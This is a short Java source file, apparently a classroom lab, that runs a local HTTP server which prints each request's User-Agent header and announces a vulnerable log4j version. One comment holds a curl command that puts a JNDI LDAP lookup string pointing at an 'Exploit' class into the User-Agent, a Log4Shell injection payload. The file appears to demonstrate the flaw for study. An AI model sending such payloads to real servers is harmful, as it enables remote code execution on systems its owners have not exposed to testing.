package de.nordakademie;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

public class Main {
    public static void main(String[] args) throws IOException {
        final int PORT = 8080;
        HttpServer server =
                HttpServer.create(new InetSocketAddress("localhost", PORT), 0);
        server.createContext("/", new RequestHandler());
        server.start();
        System.out.println("Server is running on port " + PORT);
    }

    static class RequestHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String response =
                    "I'm using a vulnerable version of log4J, enjoy!";
            // curl http://localhost:8080 --user-agent "ldap://127.0.0.1:1389/Exploit"
            // Das dann mit log4j und Jindi loggen
            System.out.println(exchange.getRequestHeaders().get("User-Agent"));
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
}

